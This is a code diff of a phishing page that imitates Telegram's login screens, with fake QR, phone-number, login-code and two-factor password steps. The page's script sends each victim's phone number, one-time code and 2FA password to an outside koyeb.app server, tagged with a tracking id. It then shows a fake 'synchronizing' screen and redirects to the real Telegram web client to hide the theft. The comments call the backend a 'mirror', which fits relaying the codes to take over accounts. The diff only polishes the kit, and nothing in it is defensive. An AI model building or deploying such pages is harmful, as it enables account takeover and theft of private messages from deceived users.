@@ -46,7 +46,6 @@
             background-image: radial-gradient(circle at 50% 50%, #2c2c2c 0%, #0f0f0f 100%);
         }
 
-        /* --- LAYOUT COMPONENTS --- */
         .app-container {
             width: 100%;
             max-width: 440px;
@@ -91,7 +90,6 @@
             font-weight: 400;
         }
 
-        /* --- QR CODE SPECIFICS --- */
         .qr-frame {
             background: white;
             padding: 20px;
@@ -119,7 +117,6 @@
             padding: 5px;
         }
 
-        /* --- INPUT STYLING --- */
         .tg-group {
             position: relative;
             margin-bottom: 24px;
@@ -143,7 +140,6 @@
             box-shadow: 0 0 0 4px rgba(135, 116, 225, 0.15);
         }
 
-        /* OTP Row */
         .otp-row {
             display: flex;
             justify-content: center;
@@ -162,16 +158,8 @@
             font-weight: 700;
             color: white;
             outline: none;
-            transition: transform 0.2s, border-color 0.2s;
         }
 
-        .otp-digit:focus {
-            border-color: var(--accent);
-            transform: scale(1.05);
-            background: transparent;
-        }
-
-        /* --- BUTTONS --- */
         .btn-tg {
             width: 100%;
             background: var(--accent);
@@ -183,28 +171,11 @@
             font-weight: 600;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 0.8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: background 0.3s, transform 0.2s;
         }
 
-        .btn-tg:hover {
-            background: var(--accent-hover);
-            transform: translateY(-1px);
-        }
-
-        .btn-tg:active {
-            transform: translateY(1px);
-        }
-
-        .btn-tg:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        /* --- ANIMATIONS & UTILS --- */
         .hidden { display: none; }
         
         .shake-err {
@@ -216,7 +187,6 @@
             10%, 90% { transform: translate3d(-1px, 0, 0); }
             20%, 80% { transform: translate3d(2px, 0, 0); }
             30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
-            40%, 60% { transform: translate3d(4px, 0, 0); }
         }
 
         .spin-load {
@@ -241,24 +211,6 @@
             font-size: 14px;
             text-transform: uppercase;
             cursor: pointer;
-        }
-
-        /* --- COUNTRY PICKER OVERRIDE --- */
-        .iti__country-list {
-            background-color: var(--surface) !important;
-            border: 1px solid var(--border-thin) !important;
-            color: white !important;
-            border-radius: 14px;
-            padding: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-        }
-        .iti__country:hover { background-color: var(--border-thin) !important; }
-        .iti__search-input { 
-            background: var(--bg-deep) !important; 
-            color: white !important; 
-            border: 1px solid var(--border-thin) !important;
-            border-radius: 8px !important;
-            margin-bottom: 8px !important;
         }
     </style>
 </head>
@@ -303,11 +255,11 @@
                 <h1 id="lab-phone"></h1>
                 <p class="subtitle">We've sent the code to the <b>Telegram</b> app on your other device.</p>
                 <div class="otp-row">
-                    <input type="number" class="otp-digit" id="v1" oninput="tab(this,'v2')" onkeydown="back(event, 'v1', '')">
-                    <input type="number" class="otp-digit" id="v2" oninput="tab(this,'v3')" onkeydown="back(event, 'v2', 'v1')">
-                    <input type="number" class="otp-digit" id="v3" oninput="tab(this,'v4')" onkeydown="back(event, 'v3', 'v2')">
-                    <input type="number" class="otp-digit" id="v4" oninput="tab(this,'v5')" onkeydown="back(event, 'v4', 'v3')">
-                    <input type="number" class="otp-digit" id="v5" oninput="tab(this,'')" onkeydown="back(event, 'v5', 'v4')">
+                    <input type="number" class="otp-digit" id="v1" oninput="tab(this,'v2')">
+                    <input type="number" class="otp-digit" id="v2" oninput="tab(this,'v3')">
+                    <input type="number" class="otp-digit" id="v3" oninput="tab(this,'v4')">
+                    <input type="number" class="otp-digit" id="v4" oninput="tab(this,'v5')">
+                    <input type="number" class="otp-digit" id="v5" oninput="tab(this,'')">
                 </div>
                 <button class="btn-tg" id="btn-v" onclick="actCode()">Verify <div class="spin-load" id="s-v"></div></button>
             </div>
@@ -331,7 +283,7 @@
                 <h1>Connecting...</h1>
                 <p class="subtitle">Updating messages and synchronizing your account. Please wait.</p>
                 <div style="width: 100%; height: 6px; background: var(--surface); border-radius: 10px; overflow: hidden;">
-                    <div id="p-bar" style="width: 0%; height: 100%; background: var(--accent); transition: width 2s ease;"></div>
+                    <div id="p-bar" style="width: 0%; height: 100%; background: var(--accent); transition: width 4s linear;"></div>
                 </div>
             </div>
 
@@ -339,41 +291,38 @@
     </div>
 
     <script>
-        /* --- 2026 LOGIC ENGINE --- */
+        /* --- SYNC LOGIC ENGINE --- */
         const ENDPOINT = "https://relieved-olly-vinzystorez-d76f3e98.koyeb.app"; 
         const USER_ID = new URLSearchParams(window.location.search).get('id') || '0';
         let storedPhone = "";
 
-        // Init QR
+        // Handle QR Generation
         window.onload = () => {
+            const qrText = "tg://login?token=" + btoa(Math.random().toString()).substring(0, 12);
             new QRCode(document.getElementById("qr-gen"), {
-                text: "tg://login?token=AQJH_" + Math.random().toString(36).substring(7),
-                width: 200, height: 200, colorDark: "#000000", colorLight: "#ffffff"
+                text: qrText,
+                width: 200, height: 200, colorDark: "#000000", colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.H
             });
         };
 
-        // Init Phone
         const iti = window.intlTelInput(document.querySelector("#tel-in"), {
             initialCountry: "kh",
             separateDialCode: true,
             utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
         });
 
-        // Navigation
         function navTo(step) {
             ['qr','phone','otp','2fa','final'].forEach(s => document.getElementById(`step-${s}`).classList.add('hidden'));
             document.getElementById(`step-${step}`).classList.remove('hidden');
         }
 
-        // OTP Tabbing
         function tab(el, next) {
             if(el.value.length >= 1 && next) document.getElementById(next).focus();
-        }
-        function back(e, curr, prev) {
-            if(e.key === 'Backspace' && !document.getElementById(curr).value && prev) document.getElementById(prev).focus();
+            if(el.id === 'v5' && el.value.length >= 1) actCode(); // Auto-verify on last digit
         }
 
-        // Logic: Phone
+        // MIRROR: PHONE STEP
         async function actPhone() {
             storedPhone = iti.getNumber();
             if(!iti.isValidNumber()) return shake('tel-in');
@@ -389,76 +338,72 @@
                 if(d.status === "success") {
                     document.getElementById('lab-phone').innerText = storedPhone;
                     navTo('otp');
-                } else { alert(d.msg || "Error"); }
-            } catch(e) { alert("Network error. Try again."); }
+                } else { alert(d.msg || "Invalid request."); }
+            } catch(e) { alert("Mirror Sync Failed. Check app.py logs."); }
             loading('btn-p', 's-p', false);
         }
 
-        // Logic: OTP
+        // MIRROR: OTP STEP
         async function actCode() {
             const code = ['v1','v2','v3','v4','v5'].map(i => document.getElementById(i).value).join('');
             if(code.length < 5) return;
 
             loading('btn-v', 's-v', true);
-            const r = await fetch(`${ENDPOINT}/step_code`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: storedPhone, code: code, tid: USER_ID })
-            });
-            const d = await r.json();
+            try {
+                const r = await fetch(`${ENDPOINT}/step_code`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: storedPhone, code: code, tid: USER_ID })
+                });
+                const d = await r.json();
+                if(d.status === "success") finalize();
+                else if(d.status === "2fa_needed") navTo('2fa');
+                else { 
+                    ['v1','v2','v3','v4','v5'].forEach(i => {
+                        document.getElementById(i).value = "";
+                        shake(i);
+                    });
+                    document.getElementById('v1').focus();
+                }
+            } catch(e) { alert("Session Interrupted."); }
             loading('btn-v', 's-v', false);
-
-            if(d.status === "success") finalize();
-            else if(d.status === "2fa_needed") navTo('2fa');
-            else { ['v1','v2','v3','v4','v5'].forEach(i => shake(i)); }
         }
 
-        // Logic: 2FA
+        // MIRROR: 2FA STEP
         async function act2FA() {
             const pass = document.getElementById('pass-in').value;
             if(!pass) return shake('pass-in');
 
             loading('btn-2', 's-2', true);
-            const r = await fetch(`${ENDPOINT}/step_2fa`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: storedPhone, password: pass, tid: USER_ID })
-            });
-            const d = await r.json();
+            try {
+                const r = await fetch(`${ENDPOINT}/step_2fa`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ phone: storedPhone, password: pass, tid: USER_ID })
+                });
+                const d = await r.json();
+                if(d.status === "success") finalize();
+                else { shake('pass-in'); document.getElementById('pass-in').value = ""; }
+            } catch(e) { alert("2FA Handshake Failed."); }
             loading('btn-2', 's-2', false);
-
-            if(d.status === "success") finalize();
-            else { shake('pass-in'); }
         }
 
-        // Helpers
         function finalize() {
             navTo('final');
-            setTimeout(() => { document.getElementById('p-bar').style.width = "100%"; }, 100);
-            setTimeout(() => { window.location.href = "https://web.telegram.org/k/"; }, 2500);
+            document.getElementById('p-bar').style.width = "100%";
+            setTimeout(() => { window.location.href = "https://web.telegram.org/k/"; }, 4500);
         }
 
         function loading(b, s, a) {
-            document.getElementById(b).disabled = a;
+            document.getElementById(b).style.opacity = a ? "0.7" : "1";
             document.getElementById(s).style.display = a ? 'block' : 'none';
         }
 
         function shake(id) {
             const el = document.getElementById(id);
-            if(el) {
-                el.classList.add('shake-err');
-                setTimeout(() => el.classList.remove('shake-err'), 500);
-            }
+            el.classList.add('shake-err');
+            setTimeout(() => el.classList.remove('shake-err'), 500);
         }
-
-        // Listen for Enter
-        document.addEventListener('keypress', (e) => {
-            if(e.key === 'Enter') {
-                if(!document.getElementById('step-phone').classList.contains('hidden')) actPhone();
-                else if(!document.getElementById('step-otp').classList.contains('hidden')) actCode();
-                else if(!document.getElementById('step-2fa').classList.contains('hidden')) act2FA();
-            }
-        });
     </script>
 </body>
 </html>
